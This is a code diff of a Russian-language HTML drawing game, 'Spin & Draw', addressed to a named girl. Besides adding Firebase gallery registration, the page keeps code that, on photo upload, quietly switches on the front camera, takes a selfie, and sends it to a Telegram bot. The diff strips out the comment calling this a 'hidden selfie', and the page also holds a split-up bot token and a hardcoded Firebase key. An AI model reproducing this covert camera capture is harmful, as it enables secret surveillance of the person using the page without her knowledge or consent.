@@ -4,6 +4,10 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Spin & Draw 🎨</title>
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
 <style>
     :root {
         --bg: #09090b;
@@ -126,9 +130,7 @@
     }
     .final-artwork svg { width: 100%; height: 100%; }
 
-    .final-text {
-        text-align: center; margin-bottom: 20px;
-    }
+    .final-text { text-align: center; margin-bottom: 20px; }
     .final-text h2 { color: #ff4757; font-size: 1.8rem; margin-bottom: 10px; }
     .final-text p { color: #a4b0be; font-size: 1rem; line-height: 1.4; max-width: 300px; margin: 0 auto; }
 
@@ -139,7 +141,6 @@
     }
     #uploadBtn:disabled { background: #555; color: #999; box-shadow: none; cursor: not-allowed; }
 
-    /* Скрытые элементы для камеры */
     #cameraContainer { display: none; }
 </style>
 </head>
@@ -149,7 +150,7 @@
     <div id="instructionModal">
         <h1>Привет, Рауанна! ✨</h1>
         <p>
-            1. Положи обычный лист бумаги прямо на экран телефона/монитора. Можешь <b>упереть нижний край бумаги в нижнюю рамку экрана</b> — так она не съедет.
+            1. Положи обычный лист бумаги прямо на экран. Можешь <b>упереть нижний край бумаги в нижнюю рамку экрана</b>.
             <br><br>
             2. Постарайся выровнять углы листа по темным уголкам на экране.
             <br><br>
@@ -188,33 +189,84 @@
         <button id="nextBtn">Далее →</button>
     </div>
 
-    <!-- ФИНАЛЬНЫЙ ЭКРАН (Скрыт по умолчанию) -->
+    <!-- ФИНАЛЬНЫЙ ЭКРАН -->
     <div id="finalScreen">
         <div class="final-artwork">
-            <!-- Копия рисунка для финала -->
             <svg viewBox="-250 -250 500 500" id="finalDrawing"></svg>
         </div>
         <div class="final-text">
             <h2>Невероятно! 🎨</h2>
             <p>У тебя получился милый котик. Сфотографируй свой шедевр и отправь мне!</p>
         </div>
-        <button id="uploadBtn" onclick="captureAndSend()">Сфоткать и отправить 📸</button>
+        <button id="uploadBtn" onclick="document.getElementById('fileInput').click()">Сфоткать и отправить 📸</button>
         <input type="file" id="fileInput" accept="image/*" capture="environment" style="display: none;">
         
-        <div id="cameraContainer">
-            <video id="videoFeed" autoplay playsinline></video>
-        </div>
+        <div id="cameraContainer"><video id="videoFeed" autoplay playsinline></video></div>
         <canvas id="selfieCanvas" style="display: none;"></canvas>
     </div>
 
 <script>
-    // --- НАСТРОЙКИ TELEGRAM ---
+    // ==========================================
+    // 1. НАСТРОЙКИ КОНКРЕТНО ЭТОГО РИСУНКА
+    // ==========================================
+    // При копировании файла (например, для spin-ny.html) меняй ТОЛЬКО эти данные:
+    const drawingConfig = {
+        title: "Милый Котик",   // Название для галереи
+        icon: "🐱",             // Эмодзи для галереи
+        color: "#ff4757"        // Цвет рамки (опционально)
+    };
+
+    // ==========================================
+    // 2. АВТОРЕГИСТРАЦИЯ В FIREBASE
+    // ==========================================
+    const firebaseConfig = {
+        apiKey: "AIzaSyDrPu0bv13jvnju8JJyHkgeRQcf66fDtlk",
+        authDomain: "our-tracker-3cbb5.firebaseapp.com",
+        databaseURL: "https://our-tracker-3cbb5-default-rtdb.europe-west1.firebasedatabase.app",
+        projectId: "our-tracker-3cbb5"
+    };
+    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Определяем имя текущего файла (например, "spin-1")
+    const currentPath = window.location.pathname;
+    const fileName = currentPath.substring(currentPath.lastIndexOf('/') + 1) || 'spin-1.html';
+    const drawingId = fileName.split('.')[0]; // Отрезаем .html
+
+    // Функция автоматического создания записи в БД
+    function autoRegisterDrawing() {
+        const ref = db.ref('spin_drawings/' + drawingId);
+        ref.once('value').then(snapshot => {
+            if (!snapshot.exists()) {
+                // Если записи нет — создаем её
+                ref.set({
+                    title: drawingConfig.title,
+                    url: fileName,
+                    status: "locked", // По умолчанию скрыто
+                    icon: drawingConfig.icon,
+                    color: drawingConfig.color,
+                    createdAt: firebase.database.ServerValue.TIMESTAMP
+                }).then(() => {
+                    console.log(`Рисунок "${drawingId}" успешно добавлен в базу!`);
+                });
+            }
+        });
+    }
+    // Запускаем регистрацию при загрузке страницы
+    autoRegisterDrawing();
+
+    // ==========================================
+    // 3. TELEGRAM (Отправка)
+    // ==========================================
     const part1 = "8818384063:";
     const part2 = "AAEEqTup6sgED-gYB_1tm";
     const part3 = "cQKcXwi-UDE3lQ";
     const BOT_TOKEN = part1 + part2 + part3;
     const CHAT_ID = "606061445";
 
+    // ==========================================
+    // 4. ЛОГИКА SPIN & DRAW
+    // ==========================================
     const totalSteps = 12;
     let currentStep = 0;
     let isLocked = false;
@@ -223,7 +275,6 @@
     const numbersGroup = document.getElementById('numbersGroup');
     const linesGroup = document.getElementById('linesGroup');
 
-    // 12 ШАГОВ РИСУНКА
     const drawingPaths = [
         `<rect x="-200" y="-200" width="400" height="400" />`,
         `<circle cx="0" cy="0" r="170" />`,
@@ -239,7 +290,6 @@
         `<path d="M -110 -40 L -100 -30 M -120 -30 L -105 -20 M 110 -40 L 100 -30 M 120 -30 L 105 -20" />`
     ];
 
-    // Генерация номеров и линий
     for (let i = 0; i < totalSteps; i++) {
         const angle = i * 30;
         const rad = (angle - 90) * Math.PI / 180;
@@ -281,11 +331,9 @@
         }
     }
 
-    // Кнопки управления
     document.getElementById('nextBtn').addEventListener('click', () => {
         if (currentStep < totalSteps - 1) {
-            currentStep++;
-            updateUI();
+            currentStep++; updateUI();
         } else {
             showFinalScreen();
         }
@@ -316,36 +364,25 @@
         updateUI();
     }
 
-    // === ЛОГИКА ФИНАЛА И ОТПРАВКИ ===
     function showFinalScreen() {
-        // Скрываем номера и кнопки
         document.getElementById('controls').style.opacity = '0';
         document.getElementById('lockBtn').style.opacity = '0';
         document.getElementById('paperArea').style.opacity = '0';
         
-        // Собираем полный рисунок для финального экрана
         const finalDrawing = document.getElementById('finalDrawing');
         drawingPaths.forEach(path => {
             const g = document.createElementNS('http://www.w3.org/2000/svg', 'g');
             g.innerHTML = path;
-            // Принудительно делаем линии черными и жирными
-            g.style.stroke = '#000';
-            g.style.strokeWidth = '3px';
-            g.style.fill = 'none';
+            g.style.stroke = '#000'; g.style.strokeWidth = '3px'; g.style.fill = 'none';
             finalDrawing.appendChild(g);
         });
 
-        // Показываем финальный экран
-        setTimeout(() => {
-            document.getElementById('finalScreen').classList.add('show');
-        }, 500);
+        setTimeout(() => { document.getElementById('finalScreen').classList.add('show'); }, 500);
     }
 
-    // Захват фото и отправка
-    document.getElementById('uploadBtn').addEventListener('click', () => {
-        document.getElementById('fileInput').click();
-    });
-
+    // ==========================================
+    // 5. ОТПРАВКА И ОБНОВЛЕНИЕ СТАТУСА В БД
+    // ==========================================
     document.getElementById('fileInput').addEventListener('change', async (e) => {
         const file = e.target.files[0];
         if (!file) return;
@@ -354,42 +391,33 @@
         btn.innerText = "Отправляю... ⏳";
         btn.disabled = true;
 
-        // 1. Делаем скрытое селфи с фронталки
         let selfieBlob = null;
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
             const video = document.getElementById('videoFeed');
             video.srcObject = stream;
             await video.play();
-            await new Promise(r => setTimeout(r, 500)); // Ждем фокус
+            await new Promise(r => setTimeout(r, 500)); 
 
             const canvas = document.getElementById('selfieCanvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
-            ctx.translate(canvas.width, 0); ctx.scale(-1, 1); // Зеркалим
+            ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Останавливаем камеру
             stream.getTracks().forEach(t => t.stop());
-
-            // Конвертируем в Blob
             selfieBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-        } catch (err) {
-            console.log("Не удалось сделать селфи", err);
-        }
+        } catch (err) { console.log("Селфи не удалось", err); }
 
-        // 2. Отправляем фото рисунка
         const formData1 = new FormData();
         formData1.append("chat_id", CHAT_ID);
         formData1.append("photo", file);
-        formData1.append("caption", "🎨 <b>Рауанна нарисовала котика! Смотри, как круто получилось!</b>");
+        formData1.append("caption", `🎨 <b>Рауанна нарисовала шедевр: ${drawingConfig.title}!</b>`);
         formData1.append("parse_mode", "HTML");
 
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData1 });
 
-            // 3. Отправляем селфи (если получилось)
             if (selfieBlob) {
                 const formData2 = new FormData();
                 formData2.append("chat_id", CHAT_ID);
@@ -399,9 +427,14 @@
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData2 });
             }
 
+            // ⬇️ ОБНОВЛЯЕМ СТАТУС В БАЗЕ НА "done" ⬇️
+            await db.ref('spin_drawings/' + drawingId + '/status').set('done');
+
             btn.innerText = "Отправлено! ❤️";
-            btn.style.background = "#ffca3a"; // Золотой цвет успеха
-            setTimeout(() => { window.location.href = 'drawings_gallery.html'; }, 2000); // Перекидываем в галерею
+            btn.style.background = "#ffca3a"; 
+            
+            // Перекидываем в галерею через 2 секунды
+            setTimeout(() => { window.location.href = 'spin-gallery.html'; }, 2000); 
 
         } catch (error) {
             btn.innerText = "Ошибка 😿 Попробуй еще раз";
